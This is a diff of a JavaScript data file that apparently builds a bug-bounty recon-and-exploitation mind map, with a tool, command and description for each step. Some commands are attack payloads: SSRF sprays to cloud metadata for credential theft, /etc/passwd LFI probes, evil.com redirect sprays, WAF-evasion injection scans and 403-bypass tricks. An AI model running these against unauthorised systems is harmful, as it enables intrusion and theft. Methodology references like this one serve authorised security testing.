+      name: "03 · HTTP Probing", icon: "🌍", _color: "#4d9de0",
       children: [
-        { name: "Fingerprinting", icon: "🔬", _color: "#bc8cff", children: [
-          { name: "httpx", _color:"#3fb950", cmd: "cat alive.txt | httpx -sc -title -tech-detect -server -cdn -json -o httpx.json", url: "https://github.com/projectdiscovery/httpx", desc: "Status, title, tech stack, server, CDN detection — THE essential probe" },
-          { name: "whatweb", _color:"#3fb950", cmd: "whatweb -i live_urls.txt --log-json whatweb.json", url: "https://github.com/urbanadventurer/WhatWeb", desc: "Aggressive fingerprint with 1800+ plugin detections" },
+        { name: "Fingerprinting", icon: "🔬", _color: "#a78bfa", children: [
+          { name: "httpx (full)", _color:"#39d353", cmd: "cat alive.txt | httpx -sc -title -tech-detect -server -cdn -json -o httpx.json", url: "https://github.com/projectdiscovery/httpx", desc: "Status, title, tech stack, server, CDN detection — THE essential probe" },
+          { name: "Wappo / WhatWeb", _color:"#39d353", cmd: "# WhatWeb:\nwhatweb -i live_urls.txt --log-json whatweb.json\n\n# wappalyzer CLI:\nwappalyzer https://target.com --recursive", url: "https://github.com/urbanadventurer/WhatWeb", desc: "Tech stack fingerprinting with 1800+ plugin detections. Identifies CMS, frameworks, server versions — used from image methodology for Tech Stack node." },
+          { name: "whatweb aggressive", _color:"#39d353", cmd: "cat live_urls.txt | xargs -I{} whatweb -a 3 {} 2>/dev/null | grep -v 'ERROR'", url: "https://github.com/urbanadventurer/WhatWeb", desc: "Aggressive WhatWeb mode — sends more requests but finds more tech details" },
         ]},
-        { name: "WAF Detection", icon: "🛡️", _color: "#bc8cff", children: [
-          { name: "wafw00f", _color:"#3fb950", cmd: "wafw00f -i live_urls.txt -o waf.txt", url: "https://github.com/EnableSecurity/wafw00f", desc: "Identify WAF: Cloudflare, Akamai, AWS WAF, ModSecurity..." },
-          { name: "Origin IP leak", _color:"#f85149", cmd: "# Check DNS history: SecurityTrails, ViewDNS.info\n# Compare CDN IP vs historical IP\n# Try: Host: target.com on suspected origin IP", url: "https://viewdns.info/iphistory/", desc: "Bypass CDN by finding origin IP — no WAF on direct access" },
+        { name: "WAF Detection", icon: "🛡️", _color: "#a78bfa", children: [
+          { name: "wafw00f", _color:"#39d353", cmd: "wafw00f -i live_urls.txt -o waf.txt", url: "https://github.com/EnableSecurity/wafw00f", desc: "Identify WAF: Cloudflare, Akamai, AWS WAF, ModSecurity..." },
+          { name: "Origin IP leak", _color:"#f05151", cmd: "# Check DNS history: SecurityTrails, ViewDNS.info\n# Compare CDN IP vs historical IP\n# Direct connection: Host: target.com on suspected origin", url: "https://viewdns.info/iphistory/", desc: "Bypass CDN by finding origin IP — no WAF on direct access" },
         ]},
-        { name: "Screenshots", icon: "📸", _color: "#bc8cff", children: [
-          { name: "gowitness", _color:"#3fb950", cmd: "gowitness file -f live_urls.txt --screenshot-path screenshots/", url: "https://github.com/sensepost/gowitness", desc: "Mass screenshots → HTML report. Spot admin panels, dev envs visually" },
+        { name: "Screenshots", icon: "📸", _color: "#a78bfa", children: [
+          { name: "gowitness", _color:"#39d353", cmd: "gowitness file -f live_urls.txt --screenshot-path screenshots/\ngowitness report generate", url: "https://github.com/sensepost/gowitness", desc: "Mass screenshots → HTML report. Spot admin panels, dev envs visually. Used in image methodology's Web Snapshot node." },
         ]},
       ]
     },
     {
-      name: "04 · Port Scanning",
-      icon: "🔌", _color: "#58a6ff",
+      name: "04 · Port Scanning", icon: "🔌", _color: "#4d9de0",
       children: [
-        { name: "Fast Scan", icon: "⚡", _color: "#bc8cff", children: [
-          { name: "naabu", _color:"#3fb950", cmd: "cat alive.txt | naabu -top-ports 1000 -silent -o ports.txt", url: "https://github.com/projectdiscovery/naabu", desc: "Fast Go-based port scanner — top 1000 ports across all hosts" },
-          { name: "masscan", _color:"#3fb950", cmd: "masscan -iL ips.txt -p0-65535 --rate 10000 -oG masscan.txt", url: "https://github.com/robertdavidgraham/masscan", desc: "Full 65535 port scan — blazing fast, use on ASN IP ranges" },
-          { name: "rustscan", _color:"#3fb950", cmd: "rustscan -a target.com --ulimit 5000 -- -sV -sC", url: "https://github.com/RustScan/RustScan", desc: "Fastest port scanner — pipes results to nmap for service detection" },
+        { name: "Fast Scan", icon: "⚡", _color: "#a78bfa", children: [
+          { name: "naabu", _color:"#39d353", cmd: "cat alive.txt | naabu -top-ports 1000 -silent -o ports.txt", url: "https://github.com/projectdiscovery/naabu", desc: "Fast Go-based port scanner — top 1000 ports across all hosts" },
+          { name: "masscan", _color:"#39d353", cmd: "masscan -iL ips.txt -p0-65535 --rate 10000 -oG masscan.txt", url: "https://github.com/robertdavidgraham/masscan", desc: "Full 65535 port scan — blazing fast, use on ASN IP ranges" },
+          { name: "rustscan", _color:"#39d353", cmd: "rustscan -a target.com --ulimit 5000 -- -sV -sC", url: "https://github.com/RustScan/RustScan", desc: "Fastest port scanner — pipes results to nmap for service detection" },
         ]},
-        { name: "Service Detection", icon: "🔎", _color: "#bc8cff", children: [
-          { name: "nmap version", _color:"#3fb950", cmd: "nmap -sV -sC -p PORTS -iL targets.txt -oA nmap_services", url: "https://nmap.org", desc: "Service version + default NSE scripts on all open ports" },
-          { name: "nmap vuln scan", _color:"#f85149", cmd: "nmap --script vuln -p PORTS -iL targets.txt -oA nmap_vulns", url: "https://nmap.org/nsedoc/categories/vuln.html", desc: "NSE vuln scripts: EternalBlue, Heartbleed, MS17-010..." },
+        { name: "Service Detection", icon: "🔎", _color: "#a78bfa", children: [
+          { name: "nmap -sV -sC", _color:"#39d353", cmd: "nmap -sV -sC -p PORTS -iL targets.txt -oA nmap_services", url: "https://nmap.org", desc: "Service version + default NSE scripts on all open ports" },
+          { name: "nmap vuln NSE", _color:"#f05151", cmd: "nmap --script vuln -p PORTS -iL targets.txt -oA nmap_vulns", url: "https://nmap.org/nsedoc/categories/vuln.html", desc: "NSE vuln scripts: EternalBlue, Heartbleed, MS17-010..." },
         ]},
-        { name: "TLS/SSL Analysis", icon: "🔐", _color: "#bc8cff", children: [
-          { name: "tlsx", _color:"#3fb950", cmd: "cat alive.txt | tlsx -san -cn -silent -json -o tls.json", url: "https://github.com/projectdiscovery/tlsx", desc: "Extract SAN fields — reveals hidden subdomains in cert" },
-          { name: "testssl.sh", _color:"#3fb950", cmd: "testssl.sh --quiet --json target.com", url: "https://github.com/drwetter/testssl.sh", desc: "Full TLS audit: weak ciphers, POODLE, ROBOT, Heartbleed" },
+        { name: "TLS/SSL Analysis", icon: "🔐", _color: "#a78bfa", children: [
+          { name: "tlsx", _color:"#39d353", cmd: "cat alive.txt | tlsx -san -cn -silent -json -o tls.json", url: "https://github.com/projectdiscovery/tlsx", desc: "Extract SAN fields — reveals hidden subdomains in cert" },
+          { name: "testssl.sh", _color:"#39d353", cmd: "testssl.sh --quiet --json target.com", url: "https://github.com/drwetter/testssl.sh", desc: "Full TLS audit: weak ciphers, POODLE, ROBOT, Heartbleed" },
         ]},
       ]
     },
     {
-      name: "05 · Content Discovery",
-      icon: "🕷️", _color: "#58a6ff",
+      name: "05 · Content Discovery", icon: "🕷️", _color: "#4d9de0",
       children: [
-        { name: "Web Crawling", icon: "🕸️", _color: "#bc8cff", children: [
-          { name: "katana", _color:"#3fb950", cmd: "katana -u live_urls.txt -jc -kf -d 5 -ef css,png,jpg -o crawled.txt", url: "https://github.com/projectdiscovery/katana", desc: "Headless Chrome crawler — finds JS-rendered routes SPAs miss" },
-          { name: "hakrawler", _color:"#3fb950", cmd: "cat live_urls.txt | hakrawler -d 3 -subs", url: "https://github.com/hakluke/hakrawler", desc: "Fast crawl with auto subdomain discovery via links" },
+        { name: "Web Crawling", icon: "🕸️", _color: "#a78bfa", children: [
+          { name: "katana", _color:"#39d353", cmd: "katana -u live_urls.txt -jc -kf -d 5 -ef css,png,jpg -o crawled.txt", url: "https://github.com/projectdiscovery/katana", desc: "Headless Chrome crawler — finds JS-rendered routes SPAs miss. Listed in image methodology active crawling." },
+          { name: "hakrawler", _color:"#39d353", cmd: "cat live_urls.txt | hakrawler -d 3 -subs", url: "https://github.com/hakluke/hakrawler", desc: "Fast crawl with auto subdomain discovery via links. Part of Katana/Hakrawler combo in image." },
+          { name: "ParamSpider", _color:"#39d353", cmd: "python3 paramspider.py -d target.com --output params.txt", url: "https://github.com/devanshbatham/ParamSpider", desc: "Mine params from Wayback archive URLs. Listed in image active crawling group alongside Katana/Hakrawler." },
+          { name: "Arjun", _color:"#39d353", cmd: "arjun -u https://target.com/api/search -oJ params.json", url: "https://github.com/s0md3v/Arjun", desc: "Discover hidden GET/POST/JSON params by response diff analysis. In image active crawling node." },
         ]},
-        { name: "Wayback Mining", icon: "📚", _color: "#bc8cff", children: [
-          { name: "gau", _color:"#3fb950", cmd: "echo target.com | gau --threads 5 --o gau.txt", url: "https://github.com/lc/gau", desc: "URLs from Wayback, Common Crawl, AlienVault, URLScan" },
-          { name: "waymore", _color:"#3fb950", cmd: "python3 waymore.py -i target.com -mode U", url: "https://github.com/xnl-h4ck3r/waymore", desc: "Advanced Wayback mining — also fetches archived response bodies" },
-          { name: "uro", _color:"#3fb950", cmd: "cat all_urls.txt | uro -o deduped_urls.txt", url: "https://github.com/s0md3v/uro", desc: "Deduplicate URLs — remove same-page-different-param junk" },
+        { name: "Wayback Mining", icon: "📚", _color: "#a78bfa", children: [
+          { name: "gau", _color:"#39d353", cmd: "echo target.com | gau --threads 5 --o gau.txt", url: "https://github.com/lc/gau", desc: "URLs from Wayback, Common Crawl, AlienVault, URLScan" },
+          { name: "waymore", _color:"#39d353", cmd: "python3 waymore.py -i target.com -mode U", url: "https://github.com/xnl-h4ck3r/waymore", desc: "Advanced Wayback mining — also fetches archived response bodies" },
+          { name: "uro", _color:"#39d353", cmd: "cat all_urls.txt | uro -o deduped_urls.txt", url: "https://github.com/s0md3v/uro", desc: "Deduplicate URLs — remove same-page-different-param junk" },
         ]},
-        { name: "Directory Brute Force", icon: "📂", _color: "#bc8cff", children: [
-          { name: "ffuf", _color:"#3fb950", cmd: "ffuf -u https://target.com/FUZZ -w raft-large-directories.txt -mc 200,301,302,403 -ac", url: "https://github.com/ffuf/ffuf", desc: "Fastest web fuzzer — .env, .git, admin panels, backup files" },
-          { name: "feroxbuster", _color:"#3fb950", cmd: "feroxbuster -u https://target.com -w wordlist.txt --smart -d 3", url: "https://github.com/epi052/feroxbuster", desc: "Recursive directory brute with smart filtering" },
-          { name: "kiterunner", _color:"#3fb950", cmd: "kr scan live_urls.txt -w routes-large.kite -x 20", url: "https://github.com/assetnote/kiterunner", desc: "API route discovery using real API patterns — finds what ffuf can't" },
-          { name: "403 Bypass", _color:"#f85149", cmd: "# Try: /admin → /Admin /ADMIN /admin/ /admin..;/ /admin;/\n# Headers: X-Original-URL: /admin, X-Rewrite-URL: /admin\n# Tools: byp4xx, 403bypasser", url: "https://github.com/iamj0ker/bypass-403", desc: "Bypass 403 Forbidden: path tricks, header injection, method tampering" },
+        { name: "Directory Brute Force", icon: "📂", _color: "#a78bfa", children: [
+          { name: "ffuf", _color:"#39d353", cmd: "ffuf -u https://target.com/FUZZ -w raft-large-directories.txt -mc 200,301,302,403 -ac", url: "https://github.com/ffuf/ffuf", desc: "Fastest web fuzzer — .env, .git, admin panels, backup files" },
+          { name: "feroxbuster", _color:"#39d353", cmd: "feroxbuster -u https://target.com -w wordlist.txt --smart -d 3", url: "https://github.com/epi052/feroxbuster", desc: "Recursive directory brute with smart filtering" },
+          { name: "kiterunner", _color:"#39d353", cmd: "kr scan live_urls.txt -w routes-large.kite -x 20", url: "https://github.com/assetnote/kiterunner", desc: "API route discovery using real API patterns — finds what ffuf can't" },
+          { name: "Nomore403", _color:"#f05151", cmd: "nomore403 -u https://target.com/admin\n# Also try: byp4xx, 403bypasser", url: "https://github.com/devploit/nomore403", desc: "Bypass 403 Forbidden automatically: path tricks, header injection, method tampering. Listed in image methodology." },
         ]},
       ]
     },
     {
-      name: "06 · JS & Secrets",
-      icon: "📜", _color: "#58a6ff",
+      name: "06 · JS & Secrets", icon: "📜", _color: "#4d9de0",
       children: [
-        { name: "JS Analysis", icon: "🔬", _color: "#bc8cff", children: [
-          { name: "LinkFinder", _color:"#3fb950", cmd: "python3 linkfinder.py -i https://target.com -d -o endpoints.txt", url: "https://github.com/GerbenJav);ma/LinkFinder", desc: "Extract API endpoints, paths, relative URLs from JavaScript" },
-          { name: "SecretFinder", _color:"#3fb950", cmd: "python3 SecretFinder.py -i https://target.com/app.js -o results.html", url: "https://github.com/m4ll0k/SecretFinder", desc: "Find API keys, tokens, passwords hardcoded in JS files" },
-          { name: "Source Maps", _color:"#f85149", cmd: "# Check: app.js.map, main.chunk.js.map\ncurl -s https://target.com/static/js/main.js.map | jq '.sources'", url: "https://developer.chrome.com/docs/devtools", desc: ".map files expose original unminified source — find ALL logic" },
+        { name: "JS Analysis", icon: "🔬", _color: "#a78bfa", children: [
+          { name: "LinkFinder", _color:"#39d353", cmd: "python3 linkfinder.py -i https://target.com -d -o endpoints.txt", url: "https://github.com/GerbenJavma/LinkFinder", desc: "Extract API endpoints, paths, relative URLs from JavaScript" },
+          { name: "SecretFinder", _color:"#39d353", cmd: "python3 SecretFinder.py -i https://target.com/app.js -o results.html", url: "https://github.com/m4ll0k/SecretFinder", desc: "Find API keys, tokens, passwords hardcoded in JS files" },
+          { name: "Source Maps", _color:"#f05151", cmd: "# Check: app.js.map, main.chunk.js.map\ncurl -s https://target.com/static/js/main.js.map | jq '.sources'", url: "https://developer.chrome.com/docs/devtools", desc: ".map files expose original unminified source — find ALL logic" },
         ]},
-        { name: "Secret Scanning", icon: "🔑", _color: "#bc8cff", children: [
-          { name: "trufflehog", _color:"#3fb950", cmd: "trufflehog filesystem --directory ./js_files/ --json", url: "https://github.com/trufflesecurity/trufflehog", desc: "Entropy + pattern analysis for leaked credentials in any files" },
-          { name: "nuclei exposures", _color:"#3fb950", cmd: "nuclei -t exposures/ -t token-spray/ -l live_urls.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "Check for exposed .env, .git, config files, API keys, tokens" },
-          { name: "gitleaks", _color:"#3fb950", cmd: "gitleaks detect --source .git_dump/ -v", url: "https://github.com/gitleaks/gitleaks", desc: "If .git exposed — scan full git history for every committed secret" },
+        { name: "Secret Scanning", icon: "🔑", _color: "#a78bfa", children: [
+          { name: "trufflehog", _color:"#39d353", cmd: "trufflehog filesystem --directory ./js_files/ --json", url: "https://github.com/trufflesecurity/trufflehog", desc: "Entropy + pattern analysis for leaked credentials in any files" },
+          { name: "nuclei exposures", _color:"#39d353", cmd: "nuclei -t exposures/ -t token-spray/ -l live_urls.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "Check for exposed .env, .git, config files, API keys, tokens" },
+          { name: "gitleaks", _color:"#39d353", cmd: "gitleaks detect --source .git_dump/ -v", url: "https://github.com/gitleaks/gitleaks", desc: "If .git exposed — scan full git history for every committed secret" },
         ]},
       ]
     },
     {
-      name: "07 · Parameter Mining",
-      icon: "⚙️", _color: "#58a6ff",
+      name: "07 · Parameter Mining", icon: "⚙️", _color: "#4d9de0",
       children: [
-        { name: "Hidden Params", icon: "🔧", _color: "#bc8cff", children: [
-          { name: "Arjun", _color:"#3fb950", cmd: "arjun -u https://target.com/api/search -oJ params.json", url: "https://github.com/s0md3v/Arjun", desc: "Discover hidden GET/POST/JSON params by response diff analysis" },
-          { name: "ParamSpider", _color:"#3fb950", cmd: "python3 paramspider.py -d target.com --output params.txt", url: "https://github.com/devanshbatham/ParamSpider", desc: "Mine params from Wayback archive URLs for the domain" },
-          { name: "x8", _color:"#3fb950", cmd: "x8 -u https://target.com/api -w params_wordlist.txt", url: "https://github.com/Sh1Yo/x8", desc: "Fast hidden param discovery with smart wordlist" },
+        { name: "Hidden Params", icon: "🔧", _color: "#a78bfa", children: [
+          { name: "Arjun", _color:"#39d353", cmd: "arjun -u https://target.com/api/search -oJ params.json", url: "https://github.com/s0md3v/Arjun", desc: "Discover hidden GET/POST/JSON params by response diff analysis" },
+          { name: "ParamSpider", _color:"#39d353", cmd: "python3 paramspider.py -d target.com --output params.txt", url: "https://github.com/devanshbatham/ParamSpider", desc: "Mine params from Wayback archive URLs for the domain" },
+          { name: "x8", _color:"#39d353", cmd: "x8 -u https://target.com/api -w params_wordlist.txt", url: "https://github.com/Sh1Yo/x8", desc: "Fast hidden param discovery with smart wordlist" },
         ]},
-        { name: "GF Pattern Classification", icon: "🏷️", _color: "#bc8cff", children: [
-          { name: "gf xss", _color:"#f85149", cmd: "cat all_urls.txt | gf xss > xss_targets.txt", url: "https://github.com/tomnomnom/gf", desc: "Filter URLs with XSS-likely params: q=, search=, msg=, error=" },
-          { name: "gf sqli", _color:"#f85149", cmd: "cat all_urls.txt | gf sqli > sqli_targets.txt", url: "https://github.com/tomnomnom/gf", desc: "Filter URLs with SQLi-likely params: id=, cat=, item=, order=" },
-          { name: "gf ssrf", _color:"#f85149", cmd: "cat all_urls.txt | gf ssrf > ssrf_targets.txt", url: "https://github.com/tomnomnom/gf", desc: "Filter URLs with SSRF-likely params: url=, redirect=, src=, dest=" },
-          { name: "gf lfi", _color:"#f85149", cmd: "cat all_urls.txt | gf lfi > lfi_targets.txt", url: "https://github.com/tomnomnom/gf", desc: "Filter URLs with LFI-likely params: file=, path=, page=, include=" },
-          { name: "gf redirect", _color:"#f85149", cmd: "cat all_urls.txt | gf redirect > redirect_targets.txt", url: "https://github.com/tomnomnom/gf", desc: "Filter URLs with redirect params: next=, return=, rurl=, continue=" },
+        { name: "GF Pattern Classification", icon: "🏷️", _color: "#a78bfa", children: [
+          { name: "gf xss", _color:"#f05151", cmd: "cat all_urls.txt | gf xss > xss_targets.txt", url: "https://github.com/tomnomnom/gf", desc: "Filter URLs with XSS-likely params: q=, search=, msg=, error=" },
+          { name: "gf sqli", _color:"#f05151", cmd: "cat all_urls.txt | gf sqli > sqli_targets.txt", url: "https://github.com/tomnomnom/gf", desc: "Filter URLs with SQLi-likely params: id=, cat=, item=, order=" },
+          { name: "gf ssrf", _color:"#f05151", cmd: "cat all_urls.txt | gf ssrf > ssrf_targets.txt", url: "https://github.com/tomnomnom/gf", desc: "Filter URLs with SSRF-likely params: url=, redirect=, src=, dest=" },
+          { name: "gf lfi", _color:"#f05151", cmd: "cat all_urls.txt | gf lfi > lfi_targets.txt", url: "https://github.com/tomnomnom/gf", desc: "Filter URLs with LFI-likely params: file=, path=, page=, include=" },
+          { name: "gf redirect", _color:"#f05151", cmd: "cat all_urls.txt | gf redirect > redirect_targets.txt", url: "https://github.com/tomnomnom/gf", desc: "Filter URLs with redirect params: next=, return=, rurl=, continue=" },
+          { name: "GF + Vuln-Specific Tool", _color:"#f05151", cmd: "# Pattern: gf <type> → pipe to specialist tool\ncat all_urls.txt | gf xss | dalfox pipe\ncat all_urls.txt | gf sqli | sqlmap -m -\ncat all_urls.txt | gf ssrf | qsreplace 'http://COLLAB'", url: "https://github.com/tomnomnom/gf", desc: "From image methodology: GF (not fixed) filters → pipe each category to its dedicated vulnerability scanner. Most efficient chain." },
         ]},
       ]
     },
     {
-      name: "08 · Nuclei Scan",
-      icon: "☢️", _color: "#58a6ff",
+      name: "08 · Nuclei Scan", icon: "☢️", _color: "#4d9de0",
       children: [
-        { name: "Multi-Pass Scan", icon: "🔄", _color: "#bc8cff", children: [
-          { name: "Pass 1: Critical/High", _color:"#f85149", cmd: "nuclei -l live_urls.txt -severity critical,high -rl 150 -o critical.txt", url: "https://github.com/projectdiscovery/nuclei", desc: "Fast triage — known critical CVEs and high-severity misconfigs" },
-          { name: "Pass 2: CVEs", _color:"#f85149", cmd: "nuclei -l live_urls.txt -t cves/ -rl 150 -o cves.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "All 3800+ CVE templates — covers 2014-2026 vulnerabilities" },
-          { name: "Pass 3: DAST Fuzzing", _color:"#f85149", cmd: "nuclei -l live_urls.txt -t dast/ -rl 100 -o dast.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "Active fuzzing: SQLi, XSS, SSTI, SSRF, LFI, command injection" },
-          { name: "Pass 4: Misconfig", _color:"#3fb950", cmd: "nuclei -l live_urls.txt -t misconfiguration/ -t exposures/ -o misconfig.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "Exposed panels, default creds, debug endpoints, config leaks" },
-          { name: "Pass 5: Network", _color:"#3fb950", cmd: "nuclei -l hosts_ports.txt -t network/ -rl 50 -o network.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "Network service vulns: Redis, MongoDB, memcached, FTP, SMB..." },
-          { name: "Pass 6: Headless", _color:"#f85149", cmd: "nuclei -l live_urls.txt -headless -t headless/ -o headless.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "Browser-based: DOM XSS, client-side vulns, JS analysis" },
-          { name: "OOB (interactsh)", _color:"#f85149", cmd: "nuclei -l live_urls.txt -t cves/ -iserver https://oast.me -o oob.txt", url: "https://github.com/projectdiscovery/interactsh", desc: "Out-of-band callbacks: blind SSRF, blind XSS, blind RCE, blind SQLi" },
+        { name: "Multi-Pass Scan", icon: "🔄", _color: "#a78bfa", children: [
+          { name: "Pass 1: Critical/High", _color:"#f05151", cmd: "nuclei -l live_urls.txt -severity critical,high -rl 150 -o critical.txt", url: "https://github.com/projectdiscovery/nuclei", desc: "Fast triage — known critical CVEs and high-severity misconfigs" },
+          { name: "Pass 2: CVEs", _color:"#f05151", cmd: "nuclei -l live_urls.txt -t cves/ -rl 150 -o cves.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "All 3800+ CVE templates — covers 2014-2026 vulnerabilities" },
+          { name: "Pass 3: DAST Fuzzing", _color:"#f05151", cmd: "nuclei -l live_urls.txt -t dast/ -rl 100 -o dast.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "Active fuzzing: SQLi, XSS, SSTI, SSRF, LFI, command injection" },
+          { name: "Pass 4: Misconfig", _color:"#39d353", cmd: "nuclei -l live_urls.txt -t misconfiguration/ -t exposures/ -o misconfig.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "Exposed panels, default creds, debug endpoints, config leaks" },
+          { name: "Pass 5: Network", _color:"#39d353", cmd: "nuclei -l hosts_ports.txt -t network/ -rl 50 -o network.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "Network service vulns: Redis, MongoDB, memcached, FTP, SMB..." },
+          { name: "Pass 6: Headless (DOM)", _color:"#f05151", cmd: "nuclei -l live_urls.txt -headless -t headless/ -o headless.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "Browser-based: DOM XSS, client-side vulns, JS analysis" },
+          { name: "OOB (interactsh)", _color:"#f05151", cmd: "nuclei -l live_urls.txt -t cves/ -iserver https://oast.me -o oob.txt", url: "https://github.com/projectdiscovery/interactsh", desc: "Out-of-band callbacks: blind SSRF, blind XSS, blind RCE, blind SQLi" },
+        ]},
+        { name: "Community & AI Templates", icon: "🤖", _color: "#a78bfa", children: [
+          { name: "Trusted Community Templates", _color:"#39d353", cmd: "# Clone curated template packs:\ngit clone https://github.com/projectdiscovery/nuclei-templates\ngit clone https://github.com/geeknik/the-nuclei-templates\ngit clone https://github.com/medbsq/ncTemplate\nnuclei -l live_urls.txt -t ./community-templates/ -o community.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "From image: use few trusted community Nuclei templates beyond official set. Curated packs with unique checks not in main repo." },
+          { name: "AI YAML Template Gen", _color:"#39d353", cmd: "# Use Claude/GPT to generate custom nuclei templates:\n# 1. Describe the vuln/endpoint behavior\n# 2. Ask AI to write a nuclei YAML template\n# 3. Test locally: nuclei -t custom.yaml -u target.com\n# 4. Validate with: nuclei -validate -t custom.yaml", url: "https://github.com/projectdiscovery/nuclei", desc: "From image: generate YAML templates using AI. Describe novel vuln patterns → AI writes nuclei template → test on target. Massive time saver for custom checks." },
+          { name: "XRAYS (Zed Attack Proxy)", _color:"#f05151", cmd: "# xray scanner:\n./xray_linux_amd64 webscan --basic-crawler https://target.com --html-output xray_report.html\n# Or passive mode with Burp:\n./xray_linux_amd64 webscan --listen 127.0.0.1:7777", url: "https://github.com/chaitin/xray", desc: "From image (XRAYS???): xray is a powerful security scanner by Chaitin. Passive + active mode, deep vulnerability detection, great for automated scanning pipelines." },
         ]},
       ]
     },
     {
-      name: "09 · Vuln Fuzzing",
-      icon: "💉", _color: "#58a6ff",
+      name: "09 · Vuln Fuzzing", icon: "💉", _color: "#4d9de0",
       children: [
-        { name: "SQL Injection", icon: "🗃️", _color: "#f85149", children: [
-          { name: "sqlmap", _color:"#f85149", cmd: "sqlmap -m sqli_targets.txt --batch --random-agent --level 3 --risk 2", url: "https://sqlmap.org", desc: "Auto SQLi: error, boolean-blind, time-blind, UNION, stacked queries" },
-          { name: "ghauri", _color:"#f85149", cmd: "ghauri -m sqli_targets.txt --batch --level 3", url: "https://github.com/r0oth3x49/ghauri", desc: "Modern sqlmap alt — better at blind injection and WAF evasion" },
+        { name: "SQL Injection", icon: "🗃️", _color: "#f05151", children: [
+          { name: "sqlmap", _color:"#f05151", cmd: "sqlmap -m sqli_targets.txt --batch --random-agent --level 3 --risk 2", url: "https://sqlmap.org", desc: "Auto SQLi: error, boolean-blind, time-blind, UNION, stacked queries" },
+          { name: "ghauri", _color:"#f05151", cmd: "ghauri -m sqli_targets.txt --batch --level 3", url: "https://github.com/r0oth3x49/ghauri", desc: "Modern sqlmap alt — better at blind injection and WAF evasion" },
         ]},
-        { name: "XSS", icon: "✨", _color: "#f85149", children: [
-          { name: "dalfox", _color:"#f85149", cmd: "cat xss_targets.txt | dalfox pipe --blind https://xss.ht --waf-evasion", url: "https://github.com/hahwul/dalfox", desc: "Context-aware XSS: HTML/JS/attr, WAF bypass, blind XSS, DOM analysis" },
-          { name: "Gxss + kxss", _color:"#f85149", cmd: "cat urls.txt | Gxss -p test | kxss", url: "https://github.com/KathanP19/Gxss", desc: "Pre-filter: find which params reflect in response before full fuzzing" },
-          { name: "XSStrike", _color:"#f85149", cmd: "python3 xsstrike.py -u 'https://target.com/search?q=test' --crawl", url: "https://github.com/s0md3v/XSStrike", desc: "Fuzzy matching XSS with context analysis and WAF detection" },
+        { name: "XSS", icon: "✨", _color: "#f05151", children: [
+          { name: "dalfox", _color:"#f05151", cmd: "cat xss_targets.txt | dalfox pipe --blind https://xss.ht --waf-evasion", url: "https://github.com/hahwul/dalfox", desc: "Context-aware XSS: HTML/JS/attr, WAF bypass, blind XSS, DOM analysis. Listed in image as Dalfox/XSStrike." },
+          { name: "XSStrike", _color:"#f05151", cmd: "python3 xsstrike.py -u 'https://target.com/search?q=test' --crawl", url: "https://github.com/s0md3v/XSStrike", desc: "Fuzzy matching XSS with context analysis and WAF detection. Listed in image methodology alongside Dalfox." },
+          { name: "Gxss + kxss", _color:"#f05151", cmd: "cat urls.txt | Gxss -p test | kxss", url: "https://github.com/KathanP19/Gxss", desc: "Pre-filter: find which params reflect in response before full fuzzing" },
         ]},
-        { name: "SSRF", icon: "🎯", _color: "#f85149", children: [
-          { name: "qsreplace SSRF", _color:"#f85149", cmd: "cat ssrf_targets.txt | qsreplace 'http://BURP_COLLAB' | httpx -silent -mc 200", url: "https://github.com/tomnomnom/qsreplace", desc: "Mass SSRF spray — replace all URL params with Collaborator URL" },
-          { name: "Cloud metadata", _color:"#f85149", cmd: "cat ssrf_targets.txt | qsreplace 'http://169.254.169.254/latest/meta-data/' | httpx -ms 'ami-id'", url: "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html", desc: "AWS/GCP/Azure metadata via SSRF = instant cloud credential theft" },
+        { name: "SSRF", icon: "🎯", _color: "#f05151", children: [
+          { name: "SSRFMap", _color:"#f05151", cmd: "python3 ssrfmap.py -r request.txt -p url\n# Also:\ncat ssrf_targets.txt | qsreplace 'http://BURP_COLLAB' | httpx -silent -mc 200", url: "https://github.com/swisskyrepo/SSRFmap", desc: "From image: SSRFMap automatically tests SSRF vectors via request file. Supports common protocols and exploits internal services." },
+          { name: "Cloud metadata via SSRF", _color:"#f05151", cmd: "cat ssrf_targets.txt | qsreplace 'http://169.254.169.254/latest/meta-data/' | httpx -ms 'ami-id'", url: "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html", desc: "AWS/GCP/Azure metadata via SSRF = instant cloud credential theft" },
         ]},
-        { name: "LFI / Path Traversal", icon: "📁", _color: "#f85149", children: [
-          { name: "qsreplace LFI", _color:"#f85149", cmd: "cat lfi_targets.txt | qsreplace '../../../../etc/passwd' | httpx -ms 'root:x:'", url: "https://github.com/tomnomnom/qsreplace", desc: "Mass LFI spray — check for /etc/passwd in all file-like params" },
-          { name: "PHP wrapper", _color:"#f85149", cmd: "cat lfi_targets.txt | qsreplace 'php://filter/convert.base64-encode/resource=index.php'", url: "https://www.php.net/manual/en/wrappers.php", desc: "PHP filter wrapper reads source code as base64 — bypasses execution" },
+        { name: "Open Redirect", icon: "↗️", _color: "#f05151", children: [
+          { name: "OpenRedireX", _color:"#f05151", cmd: "python3 openredirex.py -l redirect_targets.txt -p FUZZ --keyword FUZZ", url: "https://github.com/devanshbatham/OpenRedireX", desc: "From image: automated open redirect scanner with fuzzing. Tests redirect params across all target URLs." },
+          { name: "qsreplace redirect", _color:"#f05151", cmd: "cat redirect_targets.txt | qsreplace 'https://evil.com' | httpx -silent -location | grep evil.com", url: "https://github.com/tomnomnom/qsreplace", desc: "Mass redirect spray — replace all redirect params and check Location header" },
         ]},
-        { name: "SSTI", icon: "📝", _color: "#f85149", children: [
